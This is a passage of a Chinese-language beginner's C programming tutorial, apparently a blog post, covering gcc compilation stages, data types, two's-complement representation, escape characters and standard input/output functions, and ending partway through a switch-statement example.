    <content><![CDATA[<h1 id="Linux-C编程"><a href="#Linux-C编程" class="headerlink" title="Linux C编程"></a>Linux C编程</h1><p>C语言的源代码文件是一个普通的文本文件,但扩展名是c.而且源代码文件是不能直接执行的,需要编译,编译后的可执行文件只能在指定操作系统下运行.</p>
<p>Linux编译后的可执行程序只能在linux运行,windows编译后的程序只能在windows下运行</p>
<p>64位的linux编译后的程序只能在64位linux下运行,32位linux编译后的程序只能在32位的linux运行.</p>
<p>64位的windows编译后的程序只能在64位windows下运行,32位windows编译后的程序可以在64位的windows运行.</p>
<h2 id="头文件包含"><a href="#头文件包含" class="headerlink" title="头文件包含"></a>头文件包含</h2><p>include有两种写法</p>
<p>#include &lt;文件名&gt;,如果文件在系统目录下,那么需要用&lt;&gt;</p>
<p>#include “文件名”,如果文件在当前目录下，那么用””</p>
<h2 id="System系统调用"><a href="#System系统调用" class="headerlink" title="System系统调用"></a>System系统调用</h2><p>在使用system之前需要包含stdlib.h这个头文件,system主要的功能是通过程序执行另外一个程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;命令&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>如果在命令行执行一个程序，那么这个程序的调用者就是操作系统，如果在代码中通过system执行一个程序，那么这个程序的调用者就是自己写的代码本身.</p>
<p>C语言所有的库函数调用，只能保证语法是一致的，但不能保证执行结果是一致的，同样的库函数在不同的操作系统下执行结果可能是一样的，也可能是不一样的。</p>
<h2 id="POSIX标准"><a href="#POSIX标准" class="headerlink" title="POSIX标准"></a>POSIX标准</h2><p>POSIX是一个标准，只要符合这个标准的函数，在不同的系统下执行的结果就可以一致。</p>
<p>Unix和Linux很多库函数都是支持POSIX的，但windows支持的比较差。</p>
<p>如果将unix代码移植到linux一般代价很小，如果把windows代码移植到unix或者linux就比较麻烦.</p>
<h2 id="C语言处理过程"><a href="#C语言处理过程" class="headerlink" title="C语言处理过程"></a>C语言处理过程</h2><p>C代码编译成可执行程序经过4步:<br>1)预处理:宏定义展开、头文件展开、条件编译等，同时将代码中的注释删除，这里并不会检查语法<br>2)编译:检查语法，将预处理后文件编译生成汇编文件<br>3)汇编:将汇编文件生成目标文件(二进制文件)<br>4)链接: C语言写的程序是需要依赖各种库的，所以编译之后还需要把库链接到最终的可执行程序中去</p>
<p>预处理:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure>
<p>编译:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure>
<p>汇编:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure>
<p>链接:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc hello.o -o hello</span><br></pre></td></tr></table></figure>
<p>查看程序所需动态库:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ldd hello   //linux</span><br></pre></td></tr></table></figure>
<p>交换文件说明:<br>1) vi写文件，没有保存就关闭，自动生成一个后缀为. swp交换文件， 保存了之前写的内容<br>2)先恢复，再删除.swp交换文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi -r &#123;your file name&#125; //恢复</span><br><span class="line">rm &#123;your file name&#125;.swp   //删除</span><br></pre></td></tr></table></figure>
<h2 id="常量和变量"><a href="#常量和变量" class="headerlink" title="常量和变量"></a>常量和变量</h2><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p><strong>C的关键字共有32个</strong></p>
<ul>
<li><p>数据类型关键字(12个)</p>
<p>char, short, int, long, float, double,unsigned, signed, struct, union, enum, void</p>
</li>
<li><p>控制语句关键字(12个)</p>
<p>if, else, switch, case, default,for , do, while, break, continue, goto, return</p>
</li>
<li><p>存储类关键字(5个)</p>
<p>auto,extern,register, static,const</p>
</li>
<li><p>其他关键字(3个)</p>
<p>sizeof, typedef, volatile</p>
</li>
</ul>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>数据类型的作用:编译器预算对象(变量)分配的内存空间大小</p>
<p><img src="https://i.loli.net/2021/01/11/JgoTpVBjXIPWQLD.png" alt="image-20210111193755278"></p>
<h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><ul>
<li>在程序运行过程中，其值不能被改变的量</li>
<li>常量一般出现在表达式或赋值语句中</li>
</ul>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul>
<li>在程序运行过程中，其值可以改变</li>
<li>变量在使用前必须先定义，定义变量前必须有相应的数据类型</li>
</ul>
<p>标识符命名规则:</p>
<ul>
<li><p>标识符不能是关键字</p>
</li>
<li><p>标识符只能由字母、数字、下划线组成</p>
</li>
<li>第一个字符必须为字母或下划线</li>
<li>标识符中字母区分大小写</li>
</ul>
<p>变量特点:</p>
<ul>
<li>变量在编译时为其分配相应的内存空间</li>
<li>可以通过其名字和地址访问相应内存</li>
</ul>
<p>声明和定义区别:</p>
<ul>
<li>声明变量不需要建立存储空间，如: extern int a;(a不能赋值)</li>
<li>定义变量需要建立存储空间，如: int b;</li>
<li>-般的情况下，把建立存储空间的声明称之为“定义”，而把不需要建立存储空间的声明称之为”声明”.</li>
</ul>
<h3 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h3><h4 id="C语言如何表示相应的进制数"><a href="#C语言如何表示相应的进制数" class="headerlink" title="C语言如何表示相应的进制数"></a>C语言如何表示相应的进制数</h4><div class="table-container">
<table>
<thead>
<tr>
<th>十进制</th>
<th>以正常数字1-9开头,如123</th>
</tr>
</thead>
<tbody>
<tr>
<td>八进制</td>
<td>以0(零)开头,如0123</td>
</tr>
<tr>
<td>十六进制</td>
<td>以0x开头,如0x123</td>
</tr>
<tr>
<td>二进制</td>
<td>C语言不能直接书写二进制数</td>
</tr>
</tbody>
</table>
</div>
<h3 id="计算机内存数值存储方式"><a href="#计算机内存数值存储方式" class="headerlink" title="计算机内存数值存储方式"></a>计算机内存数值存储方式</h3><p>在计算机系统中，数值一律用补码来存储。</p>
<h4 id="原码"><a href="#原码" class="headerlink" title="原码:"></a>原码:</h4><p>最高位为符号位:0代表正数,1代表负数​</p>
<p>原码存储导致2个问题:</p>
<ol>
<li>0有两种存储方式</li>
<li>正数和负数相加结果不正确</li>
</ol>
<h4 id="反码"><a href="#反码" class="headerlink" title="反码:"></a>反码:</h4><p>反码是为了算补码.正数的原码和反码是一样的,负数的反码在原码基础上,符号位不变,其它位取反(0为1,1变0 ).</p>
<p>反码存储导致1个问题:</p>
<ol>
<li>0有两种存储方式</li>
</ol>
<h4 id="补码"><a href="#补码" class="headerlink" title="补码:"></a>补码:</h4><p>正数的原码,反码,补码都一样</p>
<p>负数的补码为其反码加1</p>
<p>十进制数,站在用户角度看,<strong>原码</strong>;二进制,八进制,十六进制,要站在计算机角度看,<strong>补码</strong>.</p>
<p>原码求补码:</p>
<ol>
<li>正数原,反,补码均相同</li>
<li>负数原码最高位不变,其他位取反得反码</li>
<li>反码加1得补码</li>
</ol>
<p>补码求原码(同上面类似):</p>
<ol>
<li>正数原,反,补码均相同</li>
<li>负数补码最高位不变,其他位取反得反码</li>
<li>反码加1得原码</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> a=<span class="number">0x81</span>;<span class="comment">//a是值为十六进制数的字符,在计算机看来是补码</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a);<span class="comment">//%d为输出十进制数,在用户看来是原码</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面程序运行结果如下:</p>
<p><img src="https://i.loli.net/2021/01/12/l23jvtQaPwTHyWG.png" alt=""></p>
<p>按照十六进制转十进制,0x81等于129而不是-127</p>
<p>分析:</p>
<ol>
<li>0x81在计算机角度看来应为补码存储,其二进制形式为10000001</li>
<li>输出%d即输出十进制数,十进制数在用户角度为原码</li>
<li>由(1)(2)知,该程序即将0x81的补码转换为原码</li>
<li>其原码为11111111,即-127</li>
</ol>
<p>有符号和无符号的区别:</p>
<ul>
<li>%d,默认以有符号的方式打印</li>
<li>%u,默认以无符号的方式打印</li>
<li>有符号，最高位是符号位，如果是1代表为负数，如果为0代表为正数</li>
<li>无符号，最高位不是符号位，是数的一部分，无符号不可能是负数</li>
</ul>
<p>数据类型范围:</p>
<p>char    1个字节</p>
<p><img src="https://i.loli.net/2021/01/12/UNxsfOjRD2cu9eY.png" alt="image-20210112214358475" style="zoom:80%;" /></p>
<p>数值越界:</p>
<p>通过以下代码解释</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">//情况1 有符号</span></span><br><span class="line">        <span class="comment">//char 范围 -128~127</span></span><br><span class="line">        <span class="keyword">char</span> a=<span class="number">127</span>+<span class="number">2</span>;</span><br><span class="line">        <span class="comment">/* a=129,转换二进制为1000 0001,</span></span><br><span class="line"><span class="comment">          二进制(1000 0001)以补码形式存储,</span></span><br><span class="line"><span class="comment">          输出为%d,要求得原码(11111111),</span></span><br><span class="line"><span class="comment">          即-127</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a);<span class="comment">//输出-127</span></span><br><span class="line">        <span class="comment">//情况2 无符号</span></span><br><span class="line">        <span class="comment">//无符号 范围 0~255</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> b=<span class="number">255</span>+<span class="number">2</span>;</span><br><span class="line">        <span class="comment">/* b=257,转换二进制为1 0000 0001,</span></span><br><span class="line"><span class="comment">           舍弃最高位为0000 0001,</span></span><br><span class="line"><span class="comment">           二进制(0000 0001)以补码形式存储,</span></span><br><span class="line"><span class="comment">           转为原码(0000 0001),</span></span><br><span class="line"><span class="comment">           即1</span></span><br><span class="line"><span class="comment">           注意编译时会警告,之后./文件名运行即可</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,b);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下:</p>
<p><img src="https://i.loli.net/2021/01/13/GL8cpTQzUtFu7n1.png" alt="image-20210113191321188"></p>
<h4 id="sizeof关键字"><a href="#sizeof关键字" class="headerlink" title="sizeof关键字"></a>sizeof关键字</h4><ul>
<li>sizeof不是函数，所以不需要包含任何头文件，它的功能是计算一个数据类型的大小，单位为字节</li>
<li>sizeof的返回值为size_ t</li>
<li>size_t 类型在32位操作系统下是unsigned int,是一个无符号的整数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*数据类型的作用:告诉编译器,</span></span><br><span class="line"><span class="comment">    定义此类型变量需要分配多大空间*/</span>					<span class="built_in">printf</span>(<span class="string">&quot;sizeof(char)=%lu\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">   	<span class="built_in">printf</span>(<span class="string">&quot;sizeof(a)=%lu\n&quot;</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下:</p>
<p><img src="https://i.loli.net/2021/01/13/3VmSN7iDcPkwLsY.png" style="zoom:150%;" /></p>
<p>%d,%o,%x,%u等均以四个字节形式打印.</p>
<p>short占两个字节,short a;与short int a;等价.</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>数据类型</th>
<th>占用空间</th>
</tr>
</thead>
<tbody>
<tr>
<td>short (短整型)</td>
<td>2字节</td>
</tr>
<tr>
<td>int (整型)</td>
<td>4字节</td>
</tr>
<tr>
<td>1ong(长整形)</td>
<td>Windows为4字节，Linux为 4字节(32位)，8字节(64位)</td>
</tr>
<tr>
<td>long long (长长整形)</td>
<td>8字节</td>
</tr>
</tbody>
</table>
</div>
<h3 id="字符型变量"><a href="#字符型变量" class="headerlink" title="字符型变量"></a>字符型变量</h3><p>字符型变量用于存储一个单一字符，在C语言中用char 表示，其中每个字符变量都会占用1个字节。在给字符型变量赋值时，需要用一对英文半角格式的单引号(‘ ‘)把字符括起来。<br>字符变量实际上并不是把该字符本身放到变量的内存单元中去，而是将该字符对应的ASCII 编码放到变量的存储单元中。char 的本质就是一个1 字节大小的整型。</p>
<p>使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man ascii</span><br></pre></td></tr></table></figure>
<p>查看ASCII码</p>
<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><p>字符在单引号内,原则上’ ‘内部只有一个字符,转义字符除外,不能char a=’abc’</p>
<p>转义字符由反斜杠\组成的多个字符</p>
<p>例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> a=<span class="string">&#x27;\r&#x27;</span>;<span class="comment">//光标移到句首</span></span><br><span class="line">        <span class="keyword">char</span> b=<span class="string">&#x27;\b&#x27;</span>;<span class="comment">//退格</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;12345%c6789\n&quot;</span>,a);<span class="comment">//先打印12345,之后光标移到句首再依次打印6789,其中1234被覆盖,留下5,结果为67895</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;abcde%cfghi\n&quot;</span>,b);<span class="comment">//先打印abcde之后打印\b,退一格,e就没了,结果为abcdfghi</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/22/wYUVzd2mpNqX3LQ.png" alt=""></p>
<h3 id="浮点型-实型"><a href="#浮点型-实型" class="headerlink" title="浮点型(实型)"></a>浮点型(实型)</h3><p>实型变量也可以称为浮点型变量，浮点型变量是用来存储小数数值的。在C语言中，浮点型变量分为两种:单精度浮点数(float)、双精度浮点数(double)，但是double型变量所表示的浮点数比float 型变量更精确。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>数据类型</th>
<th>占用空间</th>
<th>有效数字范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>float</td>
<td>4字节</td>
<td>7位有效数字</td>
</tr>
<tr>
<td>double</td>
<td>8字节</td>
<td>15~ 16位有效数字</td>
</tr>
</tbody>
</table>
</div>
<p>float存储不准确</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">float</span> a=<span class="number">100.9</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>,a);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/22/pT1JRNYS97IyjM4.png" alt=""></p>
<h3 id="类型限定符"><a href="#类型限定符" class="headerlink" title="类型限定符"></a>类型限定符</h3><div class="table-container">
<table>
<thead>
<tr>
<th>限定符</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>extern</td>
<td>声明一个变量，extexn 声明的变量没有建立存储空间。extern int a;</td>
</tr>
<tr>
<td>const</td>
<td>定义一个常量，常量的值不能修改。const int a 10;</td>
</tr>
<tr>
<td>vo1atile</td>
<td>防止编译器优化代码</td>
</tr>
<tr>
<td>register</td>
<td>定义寄存器变量，提高效率。 register是建议型的指令，而不是命令型的指令，如果CPU有空闲寄存器，那么register就生效， 如果没有空闲寄存器，那么register无效。</td>
</tr>
</tbody>
</table>
</div>
<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>字符串常量与字符常量的不同:<br>‘a’为字符常量，”a”为字符串常量</p>
<p><img src="https://i.loli.net/2021/01/22/hAXpsqiEMktCuyn.png" alt="image-20210113191321188"></p>
<p>每个字符串的结尾，编译器会自动的添加一一个结束标志位’\0’,即”a” 包含<br>两个字符’a’和’\0’。</p>
<p>%%在屏幕输出一个%，后面的d也会输出</p>
<p>%5d,以5个字符输出,没有的字符以空字符填充,默认是右对齐</p>
<p>%05d,以5个字符输出,没有的字符以0填充,默认是右对齐</p>
<p>%-5d,以5个字符输出,没有的字符以空字符填充,-代表指定为左对齐</p>
<p>0和-不能同时使用</p>
<p><img src="https://i.loli.net/2021/01/22/ts6idzBZGxWJveY.png" alt=""></p>
<h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><blockquote>
<p>遇到”\0”停止</p>
</blockquote>
<h3 id="puts"><a href="#puts" class="headerlink" title="puts()"></a>puts()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[]=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">puts</span>(buf);<span class="comment">//把buf内容输出到屏幕,自动在屏幕加换行</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);<span class="comment">//没有加换行</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/29/u4frlgbByp9IMoT.png" alt=""></p>
<h3 id="fputs"><a href="#fputs" class="headerlink" title="fputs()"></a>fputs()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[]=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="comment">//向stdout(代表屏幕,标准输出)输出buf的内容</span></span><br><span class="line">    <span class="built_in">fputs</span>(buf,<span class="built_in">stdout</span>);<span class="comment">//没有加换行</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/29/r64eO1HkSZt9JXd.png" alt="image-20210129141616052"></p>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><h3 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h3><p>scanf()的缺陷，不做越界检查,不允许有空格</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">5</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入字符串:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%s\n&quot;</span>,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/29/foM25d9lpc8aQUR.png" alt=""></p>
<h3 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h3><p>gets()从键盘读取字符串，放在指定的数组<br>gets()允许有空格，不做越界检查，此函数不安全</p>
<h3 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">        <span class="comment">//从stdin(代表标准输入,键盘)读取内容</span></span><br><span class="line">        <span class="comment">/*如果输入内容大于sizeof(buf)-1,只取	</span></span><br><span class="line"><span class="comment">        sizeof(buf)-1,放在buf所在数组;</span></span><br><span class="line"><span class="comment">        当不足sizeof(buf)-1,会把换行符读进去*/</span></span><br><span class="line">        fgets(buf,<span class="keyword">sizeof</span>(buf),<span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;buf=%s\n&quot;</span>,buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/29/qgh4QbsSC7MvWfd.png" alt=""></p>
<p>fgets()允许有空格</p>
<p><img src="https://i.loli.net/2021/01/29/6vIXpuY7SQeEKUM.png" alt=""></p>
<p>当不足sizeof(buf)-1,会把换行符读进去</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    fgets(buf,<span class="keyword">sizeof</span>(buf),<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf=#%s#\n&quot;</span>,buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/29/3gJLWmkOlP8fQKI.png" alt=""></p>
<h3 id="输入字符"><a href="#输入字符" class="headerlink" title="输入字符"></a>输入字符</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> a;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入字符:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;a);<span class="comment">//假设输入c</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a=&#x27;%c&#x27;\n&quot;</span>,a);</span><br><span class="line">        <span class="keyword">char</span> b;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入字符:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);<span class="comment">//假设输入d</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;b=&#x27;%c&#x27;\n&quot;</span>,b);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这个程序看似简单,结果为a=c,b=d,其实不然,结果如下:</p>
<p><img src="https://i.loli.net/2021/01/22/itzxmayI15d6uqO.png" alt=""></p>
<p>无需输入d直接出结果</p>
<p>原因:</p>
<p>当用户输入字符时,编译器默认把输入的内容先放在一块内存中(缓冲区) , scanf()自动在缓冲区读内容(只读一个字符).第一次输入时输入了c\n(回车),scanf取走了c,留下\n还在缓存区,第2次scanf ,由于缓冲区还有内容,所以直接取内容,无需再输入</p>
<p>所以,上面的程序可以这样写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> a;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入字符:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;a);<span class="comment">//假设输入c</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a=&#x27;%c&#x27;\n&quot;</span>,a);</span><br><span class="line">        <span class="comment">//吃掉上一步的\n,不做处理</span></span><br><span class="line">        <span class="keyword">char</span> b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);</span><br><span class="line">        <span class="keyword">char</span> t;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入字符:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;t);<span class="comment">//假设输入d</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;t=&#x27;%c&#x27;\n&quot;</span>,t);</span><br><span class="line">    	<span class="comment">//或者都在一个scanf中写</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="输入字符串"><a href="#输入字符串" class="headerlink" title="输入字符串"></a>输入字符串</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入字符串a:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);<span class="comment">//假设输入hello world</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%s\n&quot;</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入字符串b:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b=%s\n&quot;</span>,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下:</p>
<p><img src="https://i.loli.net/2021/01/29/OUtFhK74fAaNsj5.png" alt=""></p>
<p>原因:</p>
<p>当输入hello world时,第一个scanf取走第一个空格前的字符串,即hello;第二个scanf取第一个空格后第二个空格前的内容,\\n不取</p>
<p>switch语句</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">        <span class="comment">//1、switch是关键字， switch() 后面没有分号</span></span><br><span class="line">        <span class="comment">//2、switch()中() 里只能放整型变量或字符型变量</span></span><br><span class="line">        <span class="keyword">switch</span>(num)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;1楼\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;2楼\n&quot;</span>);</span><br><span class="line">                        <span 